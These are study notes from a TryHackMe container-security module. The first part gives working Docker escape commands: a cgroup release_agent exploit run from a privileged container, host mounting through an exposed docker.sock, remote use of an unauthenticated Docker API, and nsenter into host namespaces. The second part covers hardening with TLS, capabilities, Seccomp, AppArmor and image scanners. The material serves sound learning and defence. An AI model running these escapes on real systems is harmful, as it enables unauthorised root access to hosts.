---
icon: whale
description: Notes from the 'Container Security' module of TryHackMe
---

# Container Security

{% embed url="https://tryhackme.com/module/container-security" %}
Link to the module
{% endembed %}

## Container Vulnerabilities

### Privileged Containers

Docker containers can be run in two modes -

* User mode - interacts with the Host Operating System through Docker Engine
* Privileged - interacts directly with the Host OS

If a container is running with privileged access to the OS, commands can effectively be executed as root on the host. You can view capabilities of the container by running `capsh --print`.

Given below is an exploit on a privileged container using the `mount` syscall -

{% embed url="https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/" %}
The blog explaining the exploit in detail
{% endembed %}

Steps involved in the exploit -

1.  Create a group to use the Linux kernel to write and execute the exploit.

    The kernel uses `cgroups` to manage processes on the OS

    Since cgroups can be managed as root on the host, it can be mounted to `/tmp/cgrp` on the container
2. For the exploit to execute, we have to tell the kernel to run the code. Adding `1` to `/tmp/cgrp/x/notify_on_release` tells the kernel to execute something once the "cgroup" finishes
3. Find out where the container's files are stored on the host and store it as a variable.
4. Print the location of the exploit on the host system into `release_agent` so that the exploit will be executed by "cgroup" once it is released.
5. Turn the exploit into a shell on the host.
6. Execute a command, `cat /home/user1/flag.txt > $host_path/flag.txt`, to print the contents of `flag.txt` into a file on the container.
7. Make the exploit executable.
8. Create a process to store that into `/tmp/cgrp/x/cgroup.procs` so that once the process is released, the contents will be executed.

<details>

<summary>Commands to execute</summary>

{% code overflow="wrap" lineNumbers="true" %}
```bash
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/exploit" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /exploit
echo "cat /home/user1/flag.txt > $host_path/flag.txt" >> /exploit
chmod a+x /exploit
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```
{% endcode %}

</details>

### Escaping via Exposed Docker Daemon

When interacting with the Docker Engine (by running commands such as `docker run`) it is done using a socket, unless the command is executed to a remote Docker host. Unix sockets use filesystem permissions, meaning that you will have to be a member of the docker group (or root) to run Docker commands.&#x20;

The socket will be mounted on the container as a`docker.sock` file. You can search for the file using the `find` command. On Ubuntu systems, it will be located in the `/var/run` directory.

You can use the Docker daemon to create a new container and mount the host's filesystem into the container to indirectly gain access to the host's filesystem. This can be achieved by running the following command -

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

The command does the following -

1. Starts a new container with the host's file system mounted to `/mnt` in the new container
2. Runs the container interactively using `-it`
3. Changes the root directory of the container to `/mnt`
4. Tells the container to run `sh` to gain a shell and execute commands in the container

### Remote Code Execution via Exposed Docker Daemon

Docker can also use TCP sockets to achieve [IPC](https://en.wikipedia.org/wiki/Inter-process\_communication). It can be remotely administrated using tools such as Portainer or Jenkins to deploy containers for testing code. Docker Engine will listen on a port (2375 by default) when configured to be run remotely. This makes it easy to remotely access the container but it is difficult to do securely. You can find out if a device has docker remotely accessible by using nmap -

```bash
nmap -sV -p 2375 <ip_address>
```

An exposed docker daemon can be interacted with by using `curl`.

```bash
curl http://<ip_address>:2375/version
```

Docker has to be used to send commands to a target. Add `-H` to switch to the target. You can run various commands like `network`, `images`, `exec`, `run`.

```bash
docker -H tcp://<ip_address>:2375 ps
```

### Abusing Namespaces

Sometimes, containers will share the same namespace as the host OS for communication between the container and host. This can be abused by using the `nsenter` command. The command allows you to execute or start processes and place them within the same namespace as another process.&#x20;

You can abuse the fact that the container can see the `/sbin/init` process on the host to launch new commands such as a bash shell on the host. This can be done using the following command -

```bash
nsenter --target 1 --mount --uts --ipc --net /bin/bash
```

The command does the following -

1. Sets the target of the shell command as the namespace of the special system process (PID 1) to gain root
2. Sets the namespace to be mounted; If no file is specified, it will enter the mount namespace of the target process.
3. Allows you to share the same UTS (Unix Timesharing System) namespace as the target process, meaning the same hostname is used; Mismatching hostnames can cause connection issues.
4. Enters the IPC (Inter-process communication) namespace of the process which is important as it means that memory can be shared
5. Enters the network namespace to allow you to interact with network-related features of the system; For example, the network interfaces can be used to open a new connection like a stable reverse shell on the host.

`bash` will execute in the same namespace (and privileges) of the kernel.

***

## Container Hardening

### Protecting the Docker Daemon

Make sure to use secure communication and authentication methods to prevent unauthorised access to the Docker daemon.

#### SSH

You can use SSH authentication to interact with other devices running Docker. Docker uses contexts which can be thought of as profiles. Profiles allow developers to save and swap between configurations for other devices. You must have SSH access to the remote device and the user account on the remote device must have permission to execute Docker commands.

Use the following command to create a Docker context on your device -

```bash
docker context create
--docker host=ssh://<username>@<remotehost>
--description="Development Environment"
development-environment-host
```

Run the following command to switch to the created context -

```bash
docker context use development-environment-host
```

#### TLS Encryption

The Docker daemon can also be interacted with using HTTP/S. Docker will only accept remote commands from devices that have been signed against the device you wish to execute Docker commands on remotely when configured in TLS mode.

To configure TLS mode run the following command on the server that you are issuing commands to -

{% code overflow="wrap" %}
```bash
dockerd --tlsverify --tlscacert=myca.pem --tlscert=myserver-cert.pem --tlskey=myserver-key.pem -H=0.0.0.0:2376
```
{% endcode %}

Run the following command on the client that you are issuing commands from -

{% code overflow="wrap" %}
```bash
docker --tlsverify --tlscacert=myca.pem --tlscert=client-cert.pem --tlskey=client-key.pem -H=<SERVER_IP>:2386 info
```
{% endcode %}

### <mark style="background-color:yellow;">Implementing Control Groups</mark>

* control groups (cgroups) are a feature of the Linux kernel that facilitates restricting and prioritising the number of system resources a process can utilise
* improves system stability and allows administrators to track system resource use better
* for Docker, implementing cgroups helps achieve isolation and stability
* behaviour is not enabled by default on Docker and must be enabled per container when starting the container
* The switches used to specify the limit of resources a container can use
* CPU - `--cpus` - `docker run -it --cpus="1" mycontainer`
* Memory - `--memory` - `docker run -it --memory="20m" mycontainer`
* Can also update setting once the container is running
* `docker update --memory="40m" mycontainer`
* View information about a container
* `docker inspect mycontainer`
* if resource limit is set to 0, this means that no resource limits have been set

### <mark style="background-color:blue;">Preventing "Over-Privileged" Containers</mark>

* capabilities are a security feature of Linux that determines what processes can and cannot do on a granular level
* they allow us to fine-tune what privileges a process has
* CAP\_NET\_BIND\_SERVICE - allows services to bind to ports, specifically those under 1024, which usually requiers root privileges
* CAP\_SYS\_ADMIN - variety of admin privileges; mount/unmount file systems, changing network settings, performing system reboots, shutdowns, and more
* CAP\_SYS\_RESOURCE - allows a process to modify maximum limit of resources available; for example, a process can use more memory or bandwidth
* privileged contianers have full root access
* assign capabilities to containers individually instead of running containers with the `--privileged` flag
* `docker run -it --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE webserver`
* determine what capabilites are assigned to a process - `capsh --print`

### Seccomp and AppArmor

{% tabs %}
{% tab title="Seccomp" %}
It is an important security feature of Linux that restricts the actions that a program can do. It allows the user to create and enforce a list of rules of what actions (system calls) that application can make. For example, it can allow the application to make a system call to read a file but not allow it to make a system call to open a network connection. This reduces an attacker's ability to execute malicious commands whilst maintaining the application's functionality.

An example Seccomp profile for a web server that allows for files to be read and written to but does not allow for execution (execve, execveat).-

{% code title="profile.json" %}
```json
{
  "defaultAction": "SCMP_ACT_ALLOW",
  "architectures": [
    "SCMP_ARCH_X86_64",
    "SCMP_ARCH_X86",
    "SCMP_ARCH_X32"
  ],
  "syscalls": [
    { "names": [ "read", "write", "exit", "exit_group", "open", "close", "stat", "fstat", "lstat", "poll", "getdents", "munmap", "mprotect", "brk", "arch_prctl", "set_tid_address", "set_robust_list" ], "action": "SCMP_ACT_ALLOW" },
    { "names": [ "execve", "execveat" ], "action": "SCMP_ACT_ERRNO" }
  ]
}
```
{% endcode %}

Apply a profile to a container -

```bash
docker run --rm -it --security-opt seccomp=/path/to/profile.json mycontainer
```

&#x20;Resources -

{% embed url="https://man7.org/linux/man-pages/man2/seccomp.2.html" %}

{% embed url="https://docs.docker.com/engine/security/seccomp/" %}
{% endtab %}

{% tab title="AppArmor" %}
It is a similar security feature as Seccomp in Linux. It works differently, however, as it is not included in the application but in the OS. It is a Mandatory Access Control (MAC) system that determines the actions a process can execute based on a set of rules at the OS level.

Given below is a profile that makes sure that a container has the following capabilities:

* It can read files located in `/var/www/`, `/etc/apache2/mime.types` and `/run/apache2`.
* It can read and write to `/var/log/apache2`.
* It can bind to a TCP socket for port 80 but not other ports or protocols such as UDP.
* It cannot read from directories such as `/bin`, `/lib`, `/usr`.

{% code title="profile.json" %}
```
/usr/sbin/httpd {

  capability setgid,
  capability setuid,

  /var/www/** r,
  /var/log/apache2/** rw,
  /etc/apache2/mime.types r,

  /run/apache2/apache2.pid rw,
  /run/apache2/*.sock rw,

  # Network access
  network tcp,

  # System logging
  /dev/log w,

  # Allow CGI execution
  /usr/bin/perl ix,

  # Deny access to everything else
  /** ix,
  deny /bin/**,
  deny /lib/**,
  deny /usr/**,
  deny /sbin/**
}
```
{% endcode %}

To apply an AppArmor profile to a container, we need to -

1. Ensure that it is installed on the system using the command - `sudo aa-status.`
2. Create a profile.
3. Load the profile into AppArmor.
4. Run the container with the created profile.

Import the profile into AppArmor -

```bash
sudo apparmor_parser -r -W /path/to/profile.json
```

Apply it to the container at runtime -

```bash
docker run --rm -it --security-opt apparmor=/path/to/profile.json mycontainer
```

Resources -

{% embed url="https://gitlab.com/apparmor/apparmor/-/wikis/Documentation" %}

{% embed url="https://docs.docker.com/engine/security/apparmor/" %}
{% endtab %}
{% endtabs %}

### Reviewing Docker Images

You should analyse the code for Dockerfiles before using them to check for vulnerabilities or malicious actions. You can use [Dive](https://github.com/wagoodman/dive) for this. It is a tool to reverse engineer Docker images by inspecting what is executed and changed at each layer during the build process.

### Compliance and Benchmarking

<details>

<summary>Compliance Frameworks</summary>

The following frameworks can be used for compliance with regards to containers -

* [NIST SP 800-190](https://csrc.nist.gov/publications/detail/sp/800-190/final)
* [ISO 27001](https://www.iso.org/standard/27001)

</details>

<details>

<summary>Benchmarking Tools</summary>

The following tools can be used to benchmark containers -

* [CIS Docker Benchmark](https://www.cisecurity.org/benchmark/docker)
  * This tool can assess a container's compliance with the CIS Docker Benchmark framework.
* [OpenSCAP](https://www.open-scap.org/)
  * This tool can assess a container's compliance with multiple frameworks, including CIS Docker Benchmark, NIST SP-800-190 and more.
* [Docker Scout](https://docs.docker.com/scout/)
  * This tool is a cloud-based service provided by Docker itself that scans Docker images and libraries for vulnerabilities. This tool lists the vulnerabilities present and provides steps to resolve these.
* [Grype](https://github.com/anchore/grype)
  * It is a modern and fast vulnerability scanner for container images and filesystems.

</details>

Using Docker scout to scan an nginx image for known vulnerabilities -

```bash
docker scout cves local://nginx:latest
```

Using Grype to scan docker image for vulnerabilties -&#x20;

```bash
grype imagename --scope all-layers
```

Using Grype to scan exported container filesystem (exported using `docker image save`) -

```bash
grype /path/to/image.tar
```
